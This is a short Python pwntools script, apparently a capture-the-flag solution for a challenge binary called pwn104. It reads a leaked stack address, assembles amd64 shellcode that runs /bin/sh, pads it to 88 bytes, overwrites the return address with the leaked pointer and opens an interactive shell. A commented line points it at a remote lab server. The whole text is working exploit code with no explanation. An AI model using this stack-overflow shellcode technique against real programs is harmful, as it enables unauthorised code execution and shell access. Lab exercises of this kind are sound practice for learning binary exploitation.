from pwn import *

context.binary = e = ELF('./pwn104-1644300377109.pwn104')
p  = process('./pwn104-1644300377109.pwn104')
# p = remote('10.48.144.57', '9004')

p.recvuntil(b'at ')
stack_leak = p.recvline()
print(stack_leak)
stack_leak = int(stack_leak.strip(), 16)
print(stack_leak)

shellcode = asm(shellcraft.amd64.execve('/bin/sh','0','0'))

padding = (88 - len(shellcode)) * b'A'

payload = shellcode + padding + p64(stack_leak) 

p.sendline(payload)
p.interactive()